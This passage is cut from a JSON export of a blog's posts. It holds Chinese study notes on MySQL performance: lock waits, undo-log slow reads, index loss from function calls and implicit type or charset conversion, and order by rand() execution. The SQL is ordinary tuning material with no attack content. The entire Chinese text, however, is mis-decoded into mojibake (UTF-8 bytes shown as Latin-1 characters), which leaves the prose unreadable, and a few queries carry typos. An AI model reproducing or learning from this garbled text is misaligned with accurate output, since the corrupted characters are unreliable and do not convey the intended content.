å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Aï¼Œæ‰§è¡Œ select sleep(1) from tï¼Œæ•…æ„æ¯è¡Œéƒ½è°ƒç”¨ä¸€æ¬¡ sleep(1)ï¼Œè¿™æ ·è¿™ä¸ªè¯­å¥é»˜è®¤è¦æ‰§è¡Œ 10 ä¸‡ç§’ï¼ˆä¾æ®è¡¨ t çš„æ€»è¡Œæ•°ï¼‰ å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Bï¼Œæ‰§è¡Œ flush tables tï¼Œå…³é—­è¡¨ tï¼Œè¿™æ—¶å°±éœ€è¦ç­‰ session A çš„æŸ¥è¯¢ç»“æŸ æ­¤æ—¶å¦‚æœå†å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Cï¼Œæ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œå°±ä¼šè¢« flush å‘½ä»¤å µä½äº† è§£å†³æ–¹æ¡ˆåŒæ—¶æ˜¯ï¼Œæ‰¾å‡ºé€ æˆé˜»å¡çš„ process idï¼ŒæŠŠè¿™ä¸ªè¿æ¥ç”¨ kill å‘½ä»¤æ–­å¼€å³å¯ã€‚ ç­‰è¡Œé”ç°åœ¨ï¼Œç»è¿‡äº†è¡¨çº§é”çš„è€ƒéªŒï¼Œæˆ‘ä»¬çš„ select è¯­å¥ç»ˆäºæ¥åˆ°å¼•æ“é‡Œäº†ã€‚ 1select * from t where id&#x3D;1 lock in share mode; lock in share mode è¡¨ç¤ºåŠ è¯»é”ï¼ˆS é”ï¼Œå…±äº«é”ï¼‰ for update è¡¨ç¤ºåŠ å†™é”ï¼ˆX é”ï¼Œæ’ä»–é”ï¼‰ ç”±äºè®¿é—® id=1 è¿™ä¸ªè®°å½•æ—¶è¦åŠ è¯»é”ï¼Œå¦‚æœè¿™æ—¶å€™å·²ç»æœ‰ä¸€ä¸ªäº‹åŠ¡åœ¨è¿™è¡Œè®°å½•ä¸ŠæŒæœ‰ä¸€ä¸ªå†™é”ï¼Œæˆ‘ä»¬çš„ select è¯­å¥å°±ä¼šè¢«å µä½ã€‚ å¤ç°æ­¥éª¤ï¼š å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Aï¼Œæ›´æ–° id = 1 è¿™ä¸€è¡Œçš„è®°å½• å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Bï¼Œæ‰§è¡Œä¸Šé¢çš„ SQL è¯­å¥ æ˜¾ç„¶ï¼Œsession A å¯åŠ¨äº†äº‹åŠ¡ï¼Œå æœ‰å†™é”ï¼Œè¿˜ä¸æäº¤ï¼Œæ˜¯å¯¼è‡´ session B è¢«å µä½çš„åŸå› ã€‚ Mysql 5.7 å¯ä»¥é€šè¿‡ sys.innodb_lock_waits è¡¨æŸ¥åˆ°ã€‚ 1select * from sys.innodb_lock_waits where locked_table&#x3D; &#39;&#96;test_dump&#96;.&#96;t&#96;&#39;; é€šè¿‡è¿™ä¸ªå‘½ä»¤å¯ä»¥å¾—åˆ°çš„ä¿¡æ¯è¿˜æ˜¯æŒºå¤šçš„ï¼Œæ‰¾åˆ°å¯¹åº”çš„çº¿ç¨‹ idï¼Œå°†å…¶ kill æ‰å³å¯ã€‚ è¿æ¥è¢«æ–­å¼€çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨å›æ»šè¿™ä¸ªè¿æ¥é‡Œé¢æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ï¼Œä¹Ÿå°±é‡Šæ”¾äº† id=1 ä¸Šçš„è¡Œé”ã€‚ ç¬¬äºŒç±»ï¼šæŸ¥è¯¢æ…¢1select * from t where c&#x3D;50000 limit 1; ç”±äºå­—æ®µ c ä¸Šæ²¡æœ‰ç´¢å¼•ï¼Œè¿™ä¸ªè¯­å¥åªèƒ½èµ° id ä¸»é”®é¡ºåºæ‰«æï¼Œå› æ­¤éœ€è¦æ‰«æ 5 ä¸‡è¡Œã€‚ é€šè¿‡æŸ¥è¯¢æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥ç¡®å®šï¼Œç¡®å®æ‰«æäº† 5 ä¸‡è¡Œï¼Œä½†æ˜¯å¹¶ä¸æ…¢å‘€ï¼Œ2ms å°±è¿”å›äº†ã€‚ åæŸ¥è¯¢ä¸ä¸€å®šæ˜¯æ…¢æŸ¥è¯¢ã€‚æˆ‘ä»¬è¿™ä¸ªä¾‹å­é‡Œé¢åªæœ‰ 10 ä¸‡è¡Œè®°å½•ï¼Œæ•°æ®é‡å¤§èµ·æ¥çš„è¯ï¼Œæ‰§è¡Œæ—¶é—´å°±çº¿æ€§æ¶¨ä¸Šå»äº†ã€‚ æ‰«æè¡Œæ•°å¤šï¼Œæ‰€ä»¥æ‰§è¡Œæ…¢ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ã€‚ ä½†æ˜¯æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†çœ‹ä¸€ä¸ªåªæ‰«æä¸€è¡Œï¼Œä½†æ˜¯æ‰§è¡Œå¾ˆæ…¢çš„è¯­å¥ã€‚ å¤ç°æ­¥éª¤å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ session A å…ˆç”¨ start transaction with consistent snapshot å‘½ä»¤å¯åŠ¨äº†ä¸€ä¸ªäº‹åŠ¡ï¼Œä¹‹å session B æ‰å¼€å§‹æ‰§è¡Œ update è¯­å¥ã€‚ session B æ‰§è¡Œå®Œ 100 ä¸‡æ¬¡ update è¯­å¥åï¼Œç”Ÿæˆäº† 100 ä¸‡ä¸ªå›æ»šæ—¥å¿— (undo log)ã€‚ å¸¦ lock in share mode çš„ SQL è¯­å¥ï¼Œæ˜¯å½“å‰è¯»ï¼Œå› æ­¤ä¼šç›´æ¥è¯»åˆ° 1000001 è¿™ä¸ªç»“æœï¼Œæ‰€ä»¥é€Ÿåº¦å¾ˆå¿«ï¼›è€Œ select * from t where id=1 è¿™ä¸ªè¯­å¥ï¼Œæ˜¯ä¸€è‡´æ€§è¯»ï¼Œå› æ­¤éœ€è¦ä» 1000001 å¼€å§‹ï¼Œä¾æ¬¡æ‰§è¡Œ undo logï¼Œæ‰§è¡Œäº† 100 ä¸‡æ¬¡ä»¥åï¼Œæ‰å°† 1 è¿™ä¸ªç»“æœè¿”å›ã€‚ æ€»ç»“ åæŸ¥è¯¢ä¸ä¸€å®šæ˜¯æ…¢æŸ¥è¯¢ï¼Œå½“æ•°æ®é‡å¤§ä¸€äº›æ—¶ï¼Œæ‰§è¡Œæ—¶é—´å°±çº¿æ€§æ¶¨ä¸Šå»äº† è¡¨é”ã€è¡Œé”éƒ½å¯èƒ½ä¼šå¯¼è‡´é˜»å¡æŸ¥è¯¢è¯­å¥","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"18 ä¸ºä»€ä¹ˆè¿™äº›SQLè¯­å¥é€»è¾‘ç›¸åŒï¼Œæ€§èƒ½å´å·®å¼‚å·¨å¤§","slug":"why-these-sql-statements-have-the-same-logic-but-the-performance-is-very-different","date":"2022-08-12T05:12:23.000Z","updated":"2023-02-18T03:28:33.611Z","comments":true,"path":"why-these-sql-statements-have-the-same-logic-but-the-performance-is-very-different/","link":"","permalink":"https://www.0x2beace.com/why-these-sql-statements-have-the-same-logic-but-the-performance-is-very-different/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å¸¸è§çš„å‡ ç§å¯¼è‡´æ€§èƒ½å·®å¼‚å·¨å¤§çš„ SQL è¯­å¥ åœ¨ MySQL ä¸­ï¼Œæœ‰å¾ˆå¤šçœ‹ä¸Šå»é€»è¾‘ç›¸åŒï¼Œä½†æ€§èƒ½å´å·®å¼‚å·¨å¤§çš„ SQL è¯­å¥ã€‚å¯¹è¿™äº›è¯­å¥ä½¿ç”¨ä¸å½“çš„è¯ï¼Œå°±ä¼šä¸ç»æ„é—´å¯¼è‡´æ•´ä¸ªæ•°æ®åº“çš„å‹åŠ›å˜å¤§ã€‚","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å¸¸è§çš„å‡ ç§å¯¼è‡´æ€§èƒ½å·®å¼‚å·¨å¤§çš„ SQL è¯­å¥ åœ¨ MySQL ä¸­ï¼Œæœ‰å¾ˆå¤šçœ‹ä¸Šå»é€»è¾‘ç›¸åŒï¼Œä½†æ€§èƒ½å´å·®å¼‚å·¨å¤§çš„ SQL è¯­å¥ã€‚å¯¹è¿™äº›è¯­å¥ä½¿ç”¨ä¸å½“çš„è¯ï¼Œå°±ä¼šä¸ç»æ„é—´å¯¼è‡´æ•´ä¸ªæ•°æ®åº“çš„å‹åŠ›å˜å¤§ã€‚ æ¡ˆä¾‹ä¸€ï¼šæ¡ä»¶å­—æ®µå‡½æ•°æ“ä½œå½“éœ€è¦ç»Ÿè®¡æŸå¼ è¡¨çš„æŸä¸ªæœˆä»½çš„åˆè®¡æ•°é‡æ—¶ï¼Œè¿™ä¸ªæ—¶å€™é€šå¸¸ä¼šä½¿ç”¨ month() å‡½æ•°ï¼Œç±»ä¼¼çš„ SQL è¯­å¥å¦‚ä¸‹ï¼š 1select count(*) from t where month(created_at)&#x3D;7; å¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œï¼Œå¯èƒ½ä¼šç ´åç´¢å¼•å€¼çš„æœ‰åºæ€§ï¼Œå› æ­¤ä¼˜åŒ–å™¨å°±å†³å®šæ”¾å¼ƒèµ°æ ‘æœç´¢åŠŸèƒ½ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼˜åŒ–å™¨å¹¶ä¸æ˜¯è¦æ”¾å¼ƒä½¿ç”¨è¿™ä¸ªç´¢å¼•ã€‚ åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œæ”¾å¼ƒäº†æ ‘æœç´¢åŠŸèƒ½ï¼Œä¼˜åŒ–å™¨å¯ä»¥é€‰æ‹©éå†ä¸»é”®ç´¢å¼•ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©éå†ç´¢å¼• created_atï¼Œä¼˜åŒ–å™¨å¯¹æ¯”ç´¢å¼•å¤§å°åå‘ç°ï¼Œç´¢å¼• created_at æ›´å°ï¼Œéå†è¿™ä¸ªç´¢å¼•æ¯”éå†ä¸»é”®ç´¢å¼•æ¥å¾—æ›´å¿«ã€‚å› æ­¤æœ€ç»ˆè¿˜æ˜¯ä¼šé€‰æ‹©ç´¢å¼• created_atã€‚ æ‰€ä»¥ï¼Œå½“ä½¿ç”¨ explain å‘½ä»¤æŸ¥çœ‹è¿™æ¡ SQL è¯­å¥çš„æ‰§è¡Œè®¡åˆ’æ—¶ï¼š key=â€created_atâ€ è¡¨ç¤ºçš„æ˜¯ï¼Œä½¿ç”¨äº† created_at è¿™ä¸ªç´¢å¼•ï¼›åœ¨æµ‹è¯•è¡¨æ•°æ®ä¸­æ’å…¥äº† 10 ä¸‡è¡Œæ•°æ®ï¼Œrows=100335ï¼Œè¯´æ˜è¿™æ¡è¯­å¥æ‰«æäº†æ•´ä¸ªç´¢å¼•çš„æ‰€æœ‰å€¼ Extra å­—æ®µçš„ Using indexï¼Œè¡¨ç¤ºçš„æ˜¯ä½¿ç”¨äº†è¦†ç›–ç´¢å¼• ä¹Ÿå°±æ˜¯è¯´ï¼Œç”±äºåœ¨ created_at å­—æ®µåŠ äº† month() å‡½æ•°æ“ä½œï¼Œå¯¼è‡´äº†å…¨ç´¢å¼•æ‰«æã€‚ä¸ºäº†èƒ½å¤Ÿç”¨ä¸Šç´¢å¼•çš„å¿«é€Ÿå®šä½èƒ½åŠ›ï¼Œæˆ‘ä»¬å°±è¦æŠŠ SQL è¯­å¥æ”¹æˆåŸºäºå­—æ®µæœ¬èº«çš„èŒƒå›´æŸ¥è¯¢ã€‚æŒ‰ç…§ä¸‹é¢è¿™ä¸ªå†™æ³•ï¼Œä¼˜åŒ–å™¨å°±èƒ½æŒ‰ç…§æˆ‘ä»¬é¢„æœŸçš„ï¼Œç”¨ä¸Š created_at ç´¢å¼•çš„å¿«é€Ÿå®šä½èƒ½åŠ›äº†ã€‚ 1select count(*) from t where created_at &gt;&#x3D; &#39;2022-06-01&#39; and &#96;created_at&#96; &lt;&#x3D; &#39;2022-07-01&#39;; æ¡ˆä¾‹äºŒï¼šéšå¼ç±»å‹è½¬æ¢1select * from t where order_no &#x3D; 110717; è®¢å•ç¼–å· order_no è¿™ä¸ªå­—æ®µä¸Šï¼Œæœ¬æ¥å°±æœ‰ç´¢å¼•ï¼Œä½†æ˜¯ explain çš„ç»“æœå´æ˜¾ç¤ºï¼Œè¿™æ¡è¯­å¥éœ€è¦èµ°å…¨è¡¨æ‰«æã€‚ä½ å¯èƒ½ä¹Ÿå‘ç°äº†ï¼Œorder_no çš„å­—æ®µç±»å‹æ˜¯ varchar(32)ï¼Œè€Œè¾“å…¥çš„å‚æ•°å´æ˜¯æ•´å‹ï¼Œæ‰€ä»¥éœ€è¦åšç±»å‹è½¬æ¢ã€‚ é‚£ä¹ˆï¼Œç°åœ¨è¿™é‡Œå°±æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š æ•°æ®ç±»å‹è½¬æ¢çš„è§„åˆ™æ˜¯ä»€ä¹ˆï¼Ÿ ä¸ºä»€ä¹ˆæœ‰æ•°æ®ç±»å‹è½¬æ¢ï¼Œå°±éœ€è¦èµ°å…¨ç´¢å¼•æ‰«æï¼Ÿ æ•°æ®åº“é‡Œé¢ç±»å‹è¿™ä¹ˆå¤šï¼Œè¿™ç§æ•°æ®ç±»å‹è½¬æ¢è§„åˆ™æ›´å¤šï¼Œæˆ‘è®°ä¸ä½ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼Œçœ‹ select â€œ10â€ &gt; 9 çš„ç»“æœï¼š å¦‚æœè§„åˆ™æ˜¯â€œå°†å­—ç¬¦ä¸²è½¬æˆæ•°å­—â€ï¼Œé‚£ä¹ˆå°±æ˜¯åšæ•°å­—æ¯”è¾ƒï¼Œç»“æœåº”è¯¥æ˜¯ 1 å¦‚æœè§„åˆ™æ˜¯â€œå°†æ•°å­—è½¬æˆå­—ç¬¦ä¸²â€ï¼Œé‚£ä¹ˆå°±æ˜¯åšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç»“æœåº”è¯¥æ˜¯ 0 ä»å›¾ä¸­å¯çŸ¥ï¼Œselect â€œ10â€ &gt; 9 è¿”å›çš„æ˜¯ 1ï¼Œæ‰€ä»¥ä½ å°±èƒ½ç¡®è®¤ MySQL é‡Œçš„è½¬æ¢è§„åˆ™äº†ï¼šåœ¨ MySQL ä¸­ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—åšæ¯”è¾ƒçš„è¯ï¼Œæ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ã€‚ å› æ­¤ä¸Šé¢çš„è¯­å¥å¯¹äºä¼˜åŒ–å™¨æ¥è¯´ï¼Œç›¸å½“äºï¼š 1select * from t where CAST(order_no AS signed int) &#x3D; 110717; ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ¡è¯­å¥è§¦å‘äº†æˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„è§„åˆ™ï¼šå¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œï¼Œä¼˜åŒ–å™¨ä¼šæ”¾å¼ƒèµ°æ ‘æœç´¢åŠŸèƒ½ã€‚ æ¡ˆä¾‹ä¸‰ï¼šéšå¼å­—ç¬¦ç¼–ç è½¬æ¢1select d.* from tradelog l, trade_detail d where d.tradeid&#x3D;l.tradeid and l.id&#x3D;2; å½“è”è¡¨æŸ¥è¯¢æ—¶ï¼Œè¿™ä¸¤ä¸ªè¡¨çš„å­—ç¬¦é›†ä¸åŒï¼Œä¾‹å¦‚ä¸€ä¸ªæ˜¯ utf8ï¼Œå¦ä¸€ä¸ªæ˜¯ utf8mb4ï¼Œè¿™æ—¶åšè¡¨è¿æ¥æŸ¥è¯¢çš„æ—¶å€™ç”¨ä¸ä¸Šå…³è”å­—æ®µçš„ç´¢å¼•ã€‚ å­—ç¬¦é›† utf8mb4 æ˜¯ utf8 çš„è¶…é›†ï¼Œæ‰€ä»¥å½“è¿™ä¸¤ä¸ªç±»å‹çš„å­—ç¬¦ä¸²åœ¨åšæ¯”è¾ƒçš„æ—¶å€™ï¼ŒMySQL å†…éƒ¨çš„æ“ä½œæ˜¯ï¼Œå…ˆæŠŠ utf8 å­—ç¬¦ä¸²è½¬æˆ utf8mb4 å­—ç¬¦é›†ï¼Œå†åšæ¯”è¾ƒã€‚ å› æ­¤ï¼Œ åœ¨æ‰§è¡Œä¸Šé¢è¿™ä¸ªè¯­å¥çš„æ—¶å€™ï¼Œéœ€è¦å°†è¢«é©±åŠ¨æ•°æ®è¡¨é‡Œçš„å­—æ®µä¸€ä¸ªä¸ªåœ°è½¬æ¢æˆ utf8mb4ï¼Œå†è·Ÿ L2(id= 2) åšæ¯”è¾ƒã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå®é™…ä¸Šè¿™ä¸ªè¯­å¥ç­‰åŒäºä¸‹é¢è¿™ä¸ªå†™æ³•ï¼š 1select * from trade_detail where CONVERT(traideid USING utf8mb4)&#x3D;$L2.tradeid.value; CONVERT() å‡½æ•°ï¼Œåœ¨è¿™é‡Œçš„æ„æ€æ˜¯æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²è½¬æˆ utf8mb4 å­—ç¬¦é›†ã€‚ è¿™å°±å†æ¬¡è§¦å‘äº†æˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„åŸåˆ™ï¼šå¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œï¼Œä¼˜åŒ–å™¨ä¼šæ”¾å¼ƒèµ°æ ‘æœç´¢åŠŸèƒ½ã€‚ è¿æ¥è¿‡ç¨‹ä¸­è¦æ±‚åœ¨è¢«é©±åŠ¨è¡¨çš„ç´¢å¼•å­—æ®µä¸ŠåŠ å‡½æ•°æ“ä½œï¼Œæ˜¯ç›´æ¥å¯¼è‡´å¯¹è¢«é©±åŠ¨è¡¨åšå…¨è¡¨æ‰«æçš„åŸå› ã€‚ æ€»ç»“ æ¡ä»¶å­—æ®µå‡½æ•°æ“ä½œã€éšå¼ç±»å‹è½¬æ¢ã€éšå¼å­—ç¬¦ç¼–ç è½¬æ¢ï¼Œè¿™ä¸‰ä¸ªä¾‹å­éƒ½ä¼šå¯¼è‡´å¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œ å¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œï¼Œå¯èƒ½ä¼šç ´åç´¢å¼•å€¼çš„æœ‰åºæ€§ï¼Œå› æ­¤ä¼˜åŒ–å™¨å°±å†³å®šæ”¾å¼ƒèµ°æ ‘æœç´¢åŠŸèƒ½ å¯¹ç´¢å¼•å­—æ®µåšå‡½æ•°æ“ä½œï¼Œä¼šå¯¼è‡´å…¨è¡¨æ‰«çŒ«","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"17 å¦‚ä½•æ­£ç¡®åœ°æ˜¾ç¤ºéšæœºæ¶ˆæ¯","slug":"how-to-display-random-messages-correctly","date":"2022-08-10T02:26:51.000Z","updated":"2023-02-18T03:28:33.601Z","comments":true,"path":"how-to-display-random-messages-correctly/","link":"","permalink":"https://www.0x2beace.com/how-to-display-random-messages-correctly/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ order by rand èƒŒåçš„æ‰§è¡Œæµç¨‹ äº†è§£å†…å­˜ä¸´æ—¶è¡¨å’Œç£ç›˜ä¸´æ—¶è¡¨","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ order by rand èƒŒåçš„æ‰§è¡Œæµç¨‹ äº†è§£å†…å­˜ä¸´æ—¶è¡¨å’Œç£ç›˜ä¸´æ—¶è¡¨ å†…å­˜ä¸´æ—¶è¡¨Mysql ä¸­çš„ rand() å‡½æ•°é€šå¸¸ç”¨æ¥åšéšæœºæ’åºã€‚ 1select word from words order by rand() limit 3; è¿™ä¸ªè¯­å¥çš„æ„æ€å¾ˆç›´ç™½ï¼Œéšæœºæ’åºå–å‰ 3 ä¸ªã€‚è™½ç„¶è¿™ä¸ª SQL è¯­å¥å†™æ³•å¾ˆç®€å•ï¼Œä½†æ‰§è¡Œæµç¨‹å´æœ‰ç‚¹å¤æ‚çš„ã€‚ å…ˆç”¨ explain å‘½ä»¤æ¥çœ‹çœ‹è¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæƒ…å†µï¼š Extra å­—æ®µæ˜¾ç¤º Using temporaryï¼Œè¡¨ç¤ºçš„æ˜¯éœ€è¦ä½¿ç”¨ä¸´æ—¶è¡¨ï¼›Using filesortï¼Œè¡¨ç¤ºçš„æ˜¯éœ€è¦æ‰§è¡Œæ’åºæ“ä½œã€‚ å› æ­¤è¿™ä¸ª Extra çš„æ„æ€å°±æ˜¯ï¼Œéœ€è¦ä¸´æ—¶è¡¨ï¼Œå¹¶ä¸”éœ€è¦åœ¨ä¸´æ—¶è¡¨ä¸Šæ’åºã€‚ è¿™æ¡è¯­å¥çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨ã€‚è¿™ä¸ªä¸´æ—¶è¡¨ä½¿ç”¨çš„æ˜¯ memory å¼•æ“ï¼Œè¡¨é‡Œæœ‰ä¸¤ä¸ªå­—æ®µï¼Œç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ double ç±»å‹ï¼Œä¸ºäº†åé¢æè¿°æ–¹ä¾¿ï¼Œè®°ä¸ºå­—æ®µ Rï¼Œç¬¬äºŒä¸ªå­—æ®µæ˜¯ varchar(64) ç±»å‹ï¼Œè®°ä¸ºå­—æ®µ Wã€‚å¹¶ä¸”ï¼Œè¿™ä¸ªè¡¨æ²¡æœ‰å»ºç´¢å¼•ã€‚ ä» words è¡¨ä¸­ï¼ŒæŒ‰ä¸»é”®é¡ºåºå–å‡ºæ‰€æœ‰çš„ word å€¼ã€‚å¯¹äºæ¯ä¸€ä¸ª word å€¼ï¼Œè°ƒç”¨ rand() å‡½æ•°ç”Ÿæˆä¸€ä¸ªå¤§äº 0 å°äº 1 çš„éšæœºå°æ•°ï¼Œå¹¶æŠŠè¿™ä¸ªéšæœºå°æ•°å’Œ word åˆ†åˆ«å­˜å…¥ä¸´æ—¶è¡¨çš„ R å’Œ W å­—æ®µä¸­ï¼Œåˆ°æ­¤ï¼Œæ‰«æè¡Œæ•°æ˜¯ 10000ã€‚ ç°åœ¨ä¸´æ—¶è¡¨æœ‰ 10000 è¡Œæ•°æ®äº†ï¼Œæ¥ä¸‹æ¥ä½ è¦åœ¨è¿™ä¸ªæ²¡æœ‰ç´¢å¼•çš„å†…å­˜ä¸´æ—¶è¡¨ä¸Šï¼ŒæŒ‰ç…§å­—æ®µ R æ’åºã€‚ åˆå§‹åŒ– sort_bufferã€‚sort_buffer ä¸­æœ‰ä¸¤ä¸ªå­—æ®µï¼Œä¸€ä¸ªæ˜¯ double ç±»å‹ï¼Œå¦ä¸€ä¸ªæ˜¯æ•´å‹ã€‚ ä»å†…å­˜ä¸´æ—¶è¡¨ä¸­ä¸€è¡Œä¸€è¡Œåœ°å–å‡º R å€¼å’Œä½ç½®ä¿¡æ¯ï¼ˆæˆ‘åé¢ä¼šå’Œä½ è§£é‡Šè¿™é‡Œä¸ºä»€ä¹ˆæ˜¯â€œä½ç½®ä¿¡æ¯â€ï¼‰ï¼Œåˆ†åˆ«å­˜å…¥ sort_buffer ä¸­çš„ä¸¤ä¸ªå­—æ®µé‡Œã€‚è¿™ä¸ªè¿‡ç¨‹è¦å¯¹å†…å­˜ä¸´æ—¶è¡¨åšå…¨è¡¨æ‰«æï¼Œæ­¤æ—¶æ‰«æè¡Œæ•°å¢åŠ  10000ï¼Œå˜æˆäº† 20000ã€‚ åœ¨ sort_buffer ä¸­æ ¹æ® R çš„å€¼è¿›è¡Œæ’åºã€‚æ³¨æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰æ¶‰åŠåˆ°è¡¨æ“ä½œï¼Œæ‰€ä»¥ä¸ä¼šå¢åŠ æ‰«æè¡Œæ•°ã€‚ æ’åºå®Œæˆåï¼Œå–å‡ºå‰ä¸‰ä¸ªç»“æœçš„ä½ç½®ä¿¡æ¯ï¼Œä¾æ¬¡åˆ°å†…å­˜ä¸´æ—¶è¡¨ä¸­å–å‡º word å€¼ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè®¿é—®äº†è¡¨çš„ä¸‰è¡Œæ•°æ®ï¼Œæ€»æ‰«æè¡Œæ•°å˜æˆäº† 20003ã€‚ æŸ¥çœ‹æ…¢æŸ¥è¯¢æ—¥å¿—ï¼ˆslow logï¼Œå°† long_query_time çš„æ—¶é—´è®¾ç½®ä¸º 0ï¼Œè¿™æ ·æ‰€æœ‰çš„æŸ¥è¯¢éƒ½ä¼šè¢«è®°å½•åˆ°ï¼‰æ¥éªŒè¯ä¸€ä¸‹åˆ†æå¾—åˆ°çš„æ‰«æè¡Œæ•°æ˜¯å¦æ­£ç¡®ï¼š Rows_examinedï¼š20003 å°±è¡¨ç¤ºè¿™ä¸ªè¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰«æäº† 20003 è¡Œï¼Œä¹Ÿå°±éªŒè¯äº†æˆ‘ä»¬åˆ†æå¾—å‡ºçš„ç»“è®ºã€‚ éšæœºæ’åºå®Œæ•´æµç¨‹å›¾ï¼šå›¾ä¸­çš„ pos å°±æ˜¯ä½ç½®ä¿¡æ¯ï¼Œä½ å¯èƒ½ä¼šè§‰å¾—å¥‡æ€ªï¼Œè¿™é‡Œçš„â€œä½ç½®ä¿¡æ¯â€æ˜¯ä¸ªä»€ä¹ˆæ¦‚å¿µï¼Ÿåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å¯¹ InnoDB è¡¨æ’åºçš„æ—¶å€™ï¼Œæ˜æ˜ç”¨çš„è¿˜æ˜¯ ID å­—æ®µã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±è¦å›åˆ°ä¸€ä¸ªåŸºæœ¬æ¦‚å¿µï¼šMySQL çš„è¡¨æ˜¯ç”¨ä»€ä¹ˆæ–¹æ³•æ¥å®šä½â€œä¸€è¡Œæ•°æ®â€çš„ã€‚ å¦‚æœåˆ›å»ºçš„è¡¨æ²¡æœ‰ä¸»é”®ï¼Œæˆ–è€…æŠŠä¸€ä¸ªè¡¨çš„ä¸»é”®åˆ æ‰äº†ï¼Œé‚£ä¹ˆ InnoDB ä¼šè‡ªå·±ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 6 å­—èŠ‚çš„ rowid æ¥ä½œä¸ºä¸»é”®ã€‚ è¿™ä¹Ÿå°±æ˜¯æ’åºæ¨¡å¼é‡Œé¢ï¼Œrowid åå­—çš„æ¥å†ã€‚å®é™…ä¸Šå®ƒè¡¨ç¤ºçš„æ˜¯ï¼šæ¯ä¸ªå¼•æ“ç”¨æ¥å”¯ä¸€æ ‡è¯†æ•°æ®è¡Œçš„ä¿¡æ¯ã€‚ å¯¹äºæœ‰ä¸»é”®çš„ InnoDB è¡¨æ¥è¯´ï¼Œè¿™ä¸ª rowid å°±æ˜¯ä¸»é”® IDï¼› å¯¹äºæ²¡æœ‰ä¸»é”®çš„ InnoDB è¡¨æ¥è¯´ï¼Œè¿™ä¸ª 